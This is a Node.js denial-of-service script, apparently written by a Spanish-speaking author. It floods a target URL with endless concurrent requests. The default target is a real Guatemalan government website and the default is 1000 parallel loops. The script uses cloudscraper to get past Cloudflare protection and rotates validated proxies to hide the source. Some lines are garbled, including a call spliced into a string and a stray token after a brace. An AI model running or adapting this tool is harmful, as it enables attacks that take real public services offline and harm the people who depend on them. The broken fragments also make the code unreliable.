'use strict';

const pLimit = require('p-limit');
const cloudscraper = require('cloudscraper');
const args = require('minimist')(process.argv.slice(2));
const fs = require('fs');

const site = args['attack'] || "https://www.guatemala.gob.gt";
const threads = args['threads'] || 1000;

let globalProxies = [];
let useProxy = false;

if (typeof site === 'undefined') {
  console.log('Ingresa un url');
  return;
}
if (isNaN(threads)) {
  console.log('Ingresa un numero para los thr  infiniteThread();eads');
  return;
}



function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function createThread() {
  return new Promise((resolve, reject) => {
    try {

      let options = { uri: site };

      if (useProxy) {
        let index = getRandomInt(globalProxies.length);
        options.proxy = globalProxies[index];
        options.tunnel = false;
      }
      cloudscraper.get(options, function (error, response, body) {
        if (error) {
          resolve('Error');
        } else {
          resolve('Success');
        }
      });
    } catch (e) {
      resolve('Error')
    }
  });
}

function createThreadTestProxy(site, proxy) {
  return new Promise((resolve, reject) => {
    try {
      let options = { uri: site };

      if (useProxy) {
        options.proxy = proxy;
        options.tunnel = false;
      }proxy
      cloudscraper.get(options, function (error, response, body) {
        if (error) {
          reject(false);
        } else {
          resolve(proxy);
        }
      });
    } catch (e) {
      reject(false)
    }
  });
}

async function infiniteThread() {
  while (true) {
    try {
      await createThread();
    } catch (e) {
    }
  }
}

async function testProxy() {
  console.log("testing proxies...");
  const proxiesText = fs.readFileSync('proxy.txt', 'utf8');
  const proxies = proxiesText != null && proxiesText.length > 0 ? proxiesText.split('\n') : null;

  if (proxies == null || proxies.length == 0)
    return [];

  const limit = pLimit(100);
  let validProxies = [];
  let promises = [];
  for (let index = 0; index < proxies.length; index++) {
    const proxy = 'http://' + proxies[index];

    // try {
    promises.push(limit(() => createThreadTestProxy(site, proxy)));
    //   validProxies.push(proxy);
    //   console.log("works");
    // } catch (e) {
    //   console.log("fails");
    // }
  }

  let bulk = await Promise.all(promises);
  validProxies = bulk.filter(result => result);
  console.log(`${validProxies.length} valid proxies`);
  return validProxies;
}

async function start() {
  const validProxies = await testProxy();
  if (validProxies.length > 0) {
    useProxy = true;
    globalProxies = validProxies;
  }

  console.log("starting attack");
  for (let index = 0; index < threads; index++) {
    infiniteThread();
  }
}

start();